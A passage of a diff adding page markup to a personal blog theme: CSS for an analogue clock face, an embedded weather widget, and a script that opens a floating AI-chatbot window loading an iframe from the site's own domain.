+        transform: translate(-50%, -50%) rotate(54deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(11) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(60deg) translateY(-520%);
+    }
+
+    .memory:nth-child(12) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(66deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(13) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(72deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(14) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(78deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(15) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(84deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(16) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(90deg) translateY(-520%);
+    }
+
+    .memory:nth-child(17) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(96deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(18) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(102deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(19) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(108deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(20) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(114deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(21) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(120deg) translateY(-520%);
+    }
+
+    .memory:nth-child(22) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(126deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(23) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(132deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(24) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(138deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(25) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(144deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(26) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(150deg) translateY(-520%);
+    }
+
+    .memory:nth-child(27) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(156deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(28) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(162deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(29) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(168deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(30) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(174deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(31) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(180deg) translateY(-520%);
+    }
+
+    .memory:nth-child(32) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(186deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(33) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(192deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(34) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(198deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(35) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(204deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(36) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(210deg) translateY(-520%);
+    }
+
+    .memory:nth-child(37) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(216deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(38) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(222deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(39) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(228deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(40) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(234deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(41) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(240deg) translateY(-520%);
+    }
+
+    .memory:nth-child(42) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(246deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(43) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(252deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(44) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(258deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(45) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(264deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(46) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(270deg) translateY(-520%);
+    }
+
+    .memory:nth-child(47) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(276deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(48) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(282deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(49) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(288deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(50) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(294deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(51) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(300deg) translateY(-520%);
+    }
+
+    .memory:nth-child(52) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(306deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(53) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(312deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(54) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(318deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(55) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(324deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(56) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(330deg) translateY(-520%);
+    }
+
+    .memory:nth-child(57) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(336deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(58) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(342deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(59) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(348deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(60) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(354deg) translateY(-1461%);
+    }
+
+    .needle {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform-origin: center;
+    }
+
+    .needle#hours {
+        background-color: #1f1f1f;
+        width: 4%;
+        height: 30%;
+        transform-origin: center 75%;
+        transform: translate(-50%, -75%);
+    }
+
+    .needle#hours.moving {
+        transition: transform 150ms ease-out;
+    }
+
+    .needle#hours:after {
+        content: '';
+        background-color: #1f1f1f;
+        width: 4vw;
+        height: 4vw;
+        max-width: 4vh;
+        max-height: 4vh;
+        display: block;
+        position: absolute;
+        top: 75%;
+        left: 50%;
+        box-sizing: border-box;
+        border-radius: 50%;
+        transform: translate(-50%, -50%);
+    }
+
+    .needle#minutes {
+        background-color: #1f1f1f;
+        width: 2%;
+        height: 45%;
+        transform-origin: center 75%;
+        transform: translate(-50%, -75%);
+    }
+
+    .needle#minutes.moving {
+        transition: transform 150ms ease-out;
+    }
+
+    .needle#minutes:after {
+        content: '';
+        background-color: #1f1f1f;
+        width: 4vw;
+        height: 4vw;
+        max-width: 4vh;
+        max-height: 4vh;
+        display: block;
+        position: absolute;
+        top: 75%;
+        left: 50%;
+        box-sizing: border-box;
+        border-radius: 50%;
+        transform: translate(-50%, -50%);
+    }
+
+    .needle#seconds {
+        background-color: #cb2f2f;
+        width: 1%;
+        height: 50%;
+        transform-origin: center 75%;
+        transform: translate(-50%, -75%);
+    }
+
+    .needle#seconds.moving {
+        transition: transform 150ms ease-out;
+    }
+
+    .needle#seconds:after {
+        content: '';
+        background-color: #cb2f2f;
+        width: 2.5vw;
+        height: 2.5vw;
+        max-width: 2.5vh;
+        max-height: 2.5vh;
+        display: block;
+        position: absolute;
+        top: 75%;
+        left: 50%;
+        box-sizing: border-box;
+        border-radius: 50%;
+        transform: translate(-50%, -50%);
+    }
+
+    .clock_logo {
+        width: 10vw;
+        height: 10vw;
+        max-width: 10vh;
+        max-height: 10vh;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        box-sizing: border-box;
+        border-radius: 50%;
+        transform: translate(-50%, -50%);
+        background-size: 100% 100%;
+        background-repeat: no-repeat;
+    }
+
+    .clock_logo {
+        width: 10vw;
+        height: 10vw;
+        max-width: 10vh;
+        max-height: 10vh;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        box-sizing: border-box;
+        border-radius: 50%;
+        transform: translate(-50%, -50%);
+        background-image: var(--clock-logo);
+        background-size: 100% 100%;
+        background-repeat: no-repeat;
+    }
+
+    @media (min-width: 100vh) {
+        .clock {
+            border: solid 2.8vh var(--color-primary);
+            box-shadow: 0 1.4vh 2.8vh var(--color2);
+        }
+    }
+</style>
+
+    
+        
+
+        <div class="nexmoe-pd-item">
+    <div class="qweather">
+        <div id="he-plugin-standard">
+            <iframe allowtransparency="true" frameborder="0" width="304" height="96" scrolling="no"
+                src="//tianqi.2345.com/plugin/widget/index.htm?s=2&z=1&t=0&v=0&d=2&bd=0&k=000000&f=ff8040&ltf=009944&htf=cc0000&q=1&e=1&a=1&c=54511&w=300&h=96&align=center"></iframe>
+        </div>
+        <div class="qweather-logo">
+
+        </div>
+    </div>
+</div>
+
+<style>
+    .qweather {
+        position: relative;
+        padding-right: 5px;
+    }
+
+    .qweather #he-plugin-standard {
+        border: 2px solid var(--color-primary);
+        box-shadow: 0 1px 0 0 var(--color-primary), 0 1px 2px 0 var(--color-primary);
+        border-radius: 8px;
+        width: 300px;
+        overflow: hidden;
+    }
+
+    .qweather-logo {
+        position: absolute;
+        right: 0;
+        top: -15px;
+        width: 40px;
+        height: 40px;
+        background-image: var(--qweather-logo);
+        background-size: 100% 100%;
+        background-repeat: no-repeat;
+    }
+</style>
+
+    
+</div>
+<style>
+    .nexmoe-pd {
+        position: fixed;
+        left: auto;
+        top: 40px;
+        right: 0;
+    }
+    .nexmoe-pd-item{
+       display: flex;
+        justify-content: center;
+        margin-bottom: 30px;
+    }
+    #nexmoe-pendant .mdui-drawer{
+        width: 305px;
+    }
+    @media screen and (max-width: 1600px) {
+        #nexmoe-pendant {
+            display: none
+        }
+    }
+</style>
+</div><div id="nexmoe-chatbot">
+    
+<div id="ai-chatbot-button" class="ai-chatbot-button">
+
+</div>
+
+<!-- AI Chatbot Window -->
+<div id="ai-chatbot-window" class="ai-chatbot-window">
+  <div class="ai-chatbot-header">
+    <div class="ai-chatbot-title">糖糖的AI分身(BETA)</div>
+    <button id="ai-chatbot-close" class="ai-chatbot-close">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="18" y1="6" x2="6" y2="18"></line>
+        <line x1="6" y1="6" x2="18" y2="18"></line>
+      </svg>
+    </button>
+  </div>
+  <div class="ai-chatbot-content" id="ai-chatbot-content">
+    <!-- Loading Animation -->
+    <div id="ai-chatbot-loading" class="ai-chatbot-loading">
+      <div class="ai-chatbot-loading-spinner"></div>
+      <div class="ai-chatbot-loading-text">如果加载时间过长，可尝试打开系统代理</div>
+    </div>
+    <!-- iframe will be dynamically loaded here when chatbot is opened -->
+  </div>
+</div>
+
+<script>
+  // Get elements
+  const chatbotButton = document.getElementById('ai-chatbot-button');
+  const chatbotWindow = document.getElementById('ai-chatbot-window');
+  const chatbotClose = document.getElementById('ai-chatbot-close');
+  const chatbotContent = document.getElementById('ai-chatbot-content');
+  const chatbotLoading = document.getElementById('ai-chatbot-loading');
+  let iframeLoaded = false;
+  let isProcessing = false;
+
+  // Toggle chatbot window
+  function toggleChatbot() {
+    if (isProcessing) return;
+    isProcessing = true;
+
+    const isOpening = !chatbotWindow.classList.contains('ai-chatbot-window-open');
+    chatbotWindow.classList.toggle('ai-chatbot-window-open');
+    
+    // Handle background scrolling
+    if (isOpening) {
+      // Disable background scrolling when opening chatbot
+      document.body.style.overflow = 'hidden';
+      document.body.style.touchAction = 'none';
+    } else {
+      // Enable background scrolling when closing chatbot
+      document.body.style.overflow = '';
+      document.body.style.touchAction = '';
+    }
+    
+    // Load iframe only when opening the chatbot for the first time
+    if (isOpening && !iframeLoaded) {
+      // Wait for the window to be fully visible before loading iframe
+      setTimeout(() => {
+        const iframe = document.createElement('iframe');
+        iframe.src = 'https://www.tangyuxian.com/weifu.html';
+        iframe.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+        iframe.frameBorder = '0';
+        iframe.allow = 'microphone';
+        
+        // Set timeout to hide loading animation after 5 seconds
+        const loadingTimeout = setTimeout(() => {
+          if (chatbotLoading) {
+            chatbotLoading.style.display = 'none';
+          }
+        }, 5000);
+        
+        // Hide loading animation when iframe is loaded (if before 5 seconds)
+        iframe.onload = () => {
+          clearTimeout(loadingTimeout);
+          if (chatbotLoading) {
+            chatbotLoading.style.display = 'none';
+          }
+        };
+        
+        chatbotContent.appendChild(iframe);
+        iframeLoaded = true;
+      }, 300); // Wait for CSS transition to complete
+    }
+
+    // Reset processing flag after a short delay
+    setTimeout(() => {
+      isProcessing = false;
+    }, 300);
+  }
+
+  // Add event listeners for both click and touch events
+  if (chatbotButton) {
+    chatbotButton.addEventListener('click', toggleChatbot);
+    chatbotButton.addEventListener('touchstart', (e) => {
+      e.preventDefault();
+      toggleChatbot();
+    }, { passive: false });
+  }
+
+  // Close chatbot window
+  function closeChatbot() {
+    if (chatbotWindow) {
+      chatbotWindow.classList.remove('ai-chatbot-window-open');
+      // Enable background scrolling when closing chatbot
+      document.body.style.overflow = '';
+      document.body.style.touchAction = '';
+    }
+  }
+
+  if (chatbotClose) {
+    chatbotClose.addEventListener('click', closeChatbot);
+    chatbotClose.addEventListener('touchstart', (e) => {
+      e.stopPropagation();
+      closeChatbot();
+    }, { passive: true });
+  }
+
+  // Close chatbot window when clicking outside
+  window.addEventListener('click', (e) => {
+    if (e.target === chatbotWindow) {
+      chatbotWindow.classList.remove('ai-chatbot-window-open');
+      // Enable background scrolling when closing chatbot
+      document.body.style.overflow = '';
+      document.body.style.touchAction = '';
+    }
+  });
+
+  // Prevent scroll propagation from chatbot window to background
+  if (chatbotWindow) {
+    // Touch events for mobile
+    chatbotWindow.addEventListener('touchstart', (e) => {
+      e.stopPropagation();
+    }, { passive: true });
+    
+    chatbotWindow.addEventListener('touchmove', (e) => {
+      e.stopPropagation();
+    }, { passive: true });
+    
+    chatbotWindow.addEventListener('touchend', (e) => {
+      e.stopPropagation();
+    }, { passive: true });
+    
+    // Mouse events for desktop
+    chatbotWindow.addEventListener('wheel', (e) => {
+      e.stopPropagation();
+    }, { passive: true });
+  }
+</script>
+
+<style>
+  /* Chatbot Button */
+  @keyframes ai-pulse {
+    0% {
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15), 0 0 0 0 var(--color-primary);
+      transform: scale(1);
+    }
+    50% {
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15), 0 0 0 15px var(--color-primary-bg);
+      transform: scale(1.05);
+    }
+    100% {
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15), 0 0 0 0 var(--color-primary-bg);
+      transform: scale(1);
+    }
+  }
+
+  @keyframes ai-glow {
+    0% {
+      filter: drop-shadow(0 0 3px var(--color-primary));
+    }
+    50% {
+      filter: drop-shadow(0 0 8px var(--color-primary));
+    }
+    100% {
+      filter: drop-shadow(0 0 3px var(--color-primary));
+    }
+  }
+
+  .ai-chatbot-button {
+    position: fixed;
+    bottom: 2rem;
+    right: 2rem;
+    width: 6rem;
+    height: 6rem;
+    background-color: var(--color-primary);
+    background-image: var(--chat);
+    background-size: 100% 100%;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    cursor: pointer;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    transition: all 0.3s ease;
+    z-index: 9998;
+    color: white;
+    font-size: 1.5rem;
+    animation: ai-pulse 2.5s infinite, ai-glow 3s infinite;
+  }
+
+  .ai-chatbot-button:hover {
+    transform: scale(1.1);
+    box-shadow: 0 6px 16px rgba(0, 0, 0, 0.2);
+  }
+
+  /* Chatbot Window */
+  .ai-chatbot-window {
+    position: fixed;
+    bottom: 10rem;
+    right: 2rem;
+    width: 24rem;
+    height: 45rem;
+    background-color: var(--color-primary);
+    border-radius: 12px;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
+    z-index: 9999;
+    opacity: 0;
+    visibility: hidden;
+    transform: translateY(20px);
+    transition: opacity 0.3s ease, visibility 0.3s ease, transform 0.3s ease;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    -webkit-backface-visibility: hidden;
+    backface-visibility: hidden;
+    -webkit-transform-style: preserve-3d;
+    transform-style: preserve-3d;
+  }
+
+  .ai-chatbot-window-open {
+    opacity: 1;
+    visibility: visible;
+    transform: translateY(0);
+  }
+
+  /* Chatbot Header */
+  .ai-chatbot-header {
+    padding: 0.5rem;
+    background-color: var(--color-primary);
+    border-bottom: 1px solid var(--color-primary);
+    border-radius: 12px 12px 0 0;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .ai-chatbot-title {
+    font-size: 1rem;
+    font-weight: 600;
+    color: #fff;
+  }
+
+  .ai-chatbot-close {
+    background: none;
+    border: none;
+    cursor: pointer;
+    color: #fff;
+    padding: 0.25rem;
+    border-radius: 4px;
+    transition: background-color 0.2s ease;
+    cursor: pointer;
+  }
+
+  .ai-chatbot-close:hover {
+   
+  }
+
+  /* Chatbot Content */
+  .ai-chatbot-content {
+    flex: 1;
+    overflow: hidden;
+    position: relative;
+    background-color: var(--color-card);
+  }
+
+  /* Loading Animation */
+  .ai-chatbot-loading {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    background-color: var(--color-card);
+    z-index: 10;
+  }
+
+  .ai-chatbot-loading-spinner {
+    width: 50px;
+    height: 50px;
+    border: 4px solid rgba(255, 255, 255, 0.3);
+    border-radius: 50%;
+    border-top-color: var(--color-text-1);
+    animation: ai-spin 1s linear infinite;
+    margin-bottom: 1rem;
+  }
+
+  @keyframes ai-spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .ai-chatbot-loading-text {
+    color: var(--color-text-1);
+    font-size: 0.9rem;
+    text-align: center;
+    padding: 0 1rem;
+    line-height: 1.5;
+  }
+
+  /* Responsive Design */
+  @media (max-width: 768px) {
+    .ai-chatbot-button {
+      width: 5rem;
+      height: 5rem;
+      bottom: 10rem;
+      right: 1rem;
+      /* 保持动画效果在移动设备上 */
+      animation: ai-pulse 2.5s infinite, ai-glow 3s infinite;
+    }
+
+    .ai-chatbot-window {
+      width: 100vw;
+      height: 100vh;
+      top: 0;
+      left: 0;
+      bottom: 0;
+      right: 0;
+      border-radius: 0;
+    }
+  }
+</style></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div></div></body></html>
